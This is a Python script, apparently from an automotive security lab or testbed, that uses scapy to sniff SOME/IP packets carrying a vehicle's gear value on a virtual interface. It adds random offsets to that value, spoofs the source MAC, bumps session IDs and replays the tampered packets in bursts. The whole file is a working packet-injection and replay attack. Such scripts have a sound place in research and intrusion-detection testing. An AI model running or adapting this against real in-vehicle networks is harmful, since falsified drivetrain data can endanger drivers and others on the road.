from scapy.all import *
from scapy.contrib.automotive.someip import *

from common import update_udp_chksum
from common import Replay
import pdb
import time
import struct
import numpy as np

variables = [random.randint(1, 3) for _ in range(100)]
index = 0

def process_packet(packet):
    global index
    gear = struct.unpack('>i', bytes(packet[SOMEIP].payload))[0]

    packets = []
    for _ in range(Replay.packet_series_count):
        gear_tempered = gear + variables[index]
        index += 1
        if index >= 100:
            index = 0
        data = struct.pack('>i', gear_tempered)
        packet[SOMEIP].payload = Raw(load=data)
        packet[IP].ttl = 5
        packet[Ether].src = '00:00:00:00:00:08'
        packet[SOMEIP].session_id += 10
        if packet[SOMEIP].session_id >= 65535:
            packet[SOMEIP].session_id = 1

        packet = update_udp_chksum(packet)
        packets.append(packet)

    print(f"[Replay] gear_orig({gear}), gear_temp({gear_tempered})")
    sendp(packets, iface='veth0.3', inter=Replay.transmission_interval)

filter = "udp and src host 10.0.3.1 and src port 32000"
sniff(filter=filter, iface='veth0.3', prn=process_packet)

